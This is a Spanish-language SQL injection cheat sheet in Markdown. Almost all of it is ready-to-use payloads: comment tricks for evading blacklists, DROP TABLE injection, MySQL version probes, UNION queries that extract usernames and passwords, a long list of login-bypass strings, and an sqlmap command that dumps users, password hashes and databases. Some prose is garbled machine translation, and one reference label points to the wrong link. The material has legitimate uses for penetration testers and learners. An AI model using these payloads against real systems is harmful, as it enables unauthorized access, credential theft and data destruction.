# SQL Injection
> Sql Injection ó Inyección SQL es una vulnerabilidad que permite al atacante enviar o “inyectar” instrucciones SQL de forma maliciosa y malintencionada dentro del código SQL programado para la manipulación de bases de datos.
## Referencia de sintaxis, ejemplos de ataques y trucos de inyección de SQL
```
Username: admin'--
SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' 
```
Comente el resto de la consulta al no cerrarlos o puede usar para omitir la lista negra, eliminar espacios, ofuscar y determinar las versiones de la base de datos.
```
/*Comment Here*/ (SM)
DROP/*comment*/sampletable
DR/**/OP/*bypass blacklisting*/sampletable
SELECT/*avoid-spaces*/password/**/FROM/**/Members
/*! MYSQL Special SQL *
```
## Ejemplos de ataques de inyección SQL de comentarios en línea clásicos
```
ID: 10; DROP TABLE members /* 
SELECT /*!32302 1/0, */ 1 FROM tablename 
```
Simplemente deshazte de otras cosas al final de la consulta. Igual que 10; Miembros de DROP TABLE -
## Ataques de muestra de detección de versiones de MySQL
```
ID: /*!32302 10*/
ID: 10 
SELECT /*!32302 1/0, */ 1 FROM tablename 
```
Lanzará una división por error 0 si la versión de MySQL es superior a 3.23.02
## Con union, realiza consultas SQL entre tablas. Básicamente, puede envenenar la consulta para devolver registros de otra tabla.
```
SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members 
' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
```
## Omisión(bypass) de autenticación
```
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
admin" --
admin';-- azer 
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
```
## Inyección de SQL usando SQLmap
```
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```
Puedes descargar SQLMap a través de su página Web [sqlmap.org](http://sqlmap.org/) o usar GIT:
```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev*
```
## Referencias 
* [OpenWebinars](https://openwebinars.net/blog/que-es-sql-injection/)
* [Netsparker](https://openwebinars.net/blog/que-es-sql-injection/)
